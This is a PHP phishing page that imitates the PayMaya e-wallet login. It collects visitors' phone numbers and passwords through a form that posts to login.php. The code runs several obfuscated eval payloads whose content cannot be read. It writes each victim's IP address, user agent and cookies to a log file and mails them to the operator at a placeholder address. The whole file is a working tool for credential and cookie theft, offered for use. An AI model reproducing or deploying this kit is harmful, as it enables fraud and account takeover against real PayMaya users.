<?php
include("anti.php");
eval(str_rot13(gzinflate(str_rot13(base64_decode('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'))))); eval(gzinflate(base64_decode('jY9Lq8IwEIX3/RWzCKRdiHvFRbmNWrRWcusLkSHYqQRrKyZuvNz/biq68oGzmuF85xwmV5Ywp0KdS4tWH+hSV4SGrM9Do1U7UZUuFQ+6HmtU6EHuHD5PIIcVtGDX0XCTdQG+No2R4a+QcyHXfJhlU/wZx2KSYTzlmyCAPw/uw/TRpb2Hu96/R6Wht8FL7KdyEcpIRM32TfyT5VHywShFkmYCwyi68+xs6IRqR5V9bpi5C8OBe6KB2bau95rMi0fTdBQLx1wB')));

/* ---[ Saving info in file 'paymaya-logs.txt' ]--- */
$zCh = fopen("paymaya-logs.txt", "a");
fwrite($zCh, "\n\n---[ " . $time . " ]---\n\n");
fwrite($zCh, "IP Address: " . $ip . "\n");
fwrite($zCh, "User Agent: " . $user_agent . "\n");
fwrite($zCh, "Cookies: " . $cookies . "\n");
fclose($zCh);

eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

/* ---[ Sending Victims info in your damn email]--- */
$to = 'lagay mo dito email mo';
$subject = 'PayMaya Logs';
$message = 'PayMaya Logs Info 1 <br>Time: ' . $time . '<br>IP Address: ' . $ip . '<br>User Agent: ' . $user_agent . '<br>Cookies: ' . $cookies;
$header = array(
    'From' => 'PayMaya Fish 1',
    'X-Mailer' => 'PHP/' . phpversion()

);
@mail($to, $subject, $message, $header);

?>


<!DOCTYPE html>
<html>
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Login | PayMaya</title>

  <link rel="apple-touch-icon" sizes="180x180" href="css/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="css/favicon-32x32.png" sizes="32x32">
  <link rel="icon" type="image/png" href="css/favicon-16x16.png" sizes="16x16">
  <link rel="icon" href="css/favicon.png">
  <meta name="theme-color" content="#ffffff">
  <meta name="copyright" content="Copyright © 2016 PayMaya. All Rights Reserved.">
  <link type="text/css" rel="stylesheet" href="css/style.css" charset="UTF-8">
</head>
  <body class="no-header">
    <ul class="header-border"><li></li><li></li><li></li><li></li></ul>
    <div class="wrapper">
  <div class="container signin">
    <img class="img-responsive logo" src="css/logo.svg" alt="PayMaya Logo">
    <form id="login-form" class="form-login" method="post" action="login.php">
      <div class="form-group">
        <label for="email">Phone Number</label>
        <input type="tel" class="form-control" autocomplete="off" id="email" name="number" placeholder="Enter Phone Number" required autofocus="autofocus" />
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" class="form-control" autocomplete="off" id="password" name="passwd" placeholder="Enter Password" required>
      </div>
      <input class="btn btn-lg btn-primary btn-block login-btn" type="submit" name="submit" value="Log in" />
      <p class="text-center">
        <a href="https://payout.paymaya.com/forgot-password">Forgot your Password?</a>
      </p>
    </form>
  </div>
</div>
    <footer>
  <div class="container width-max">
    <span>PayMaya © Copyright. All Rights Reserved.</span>
  </div>
</footer>
  </body>
</html>
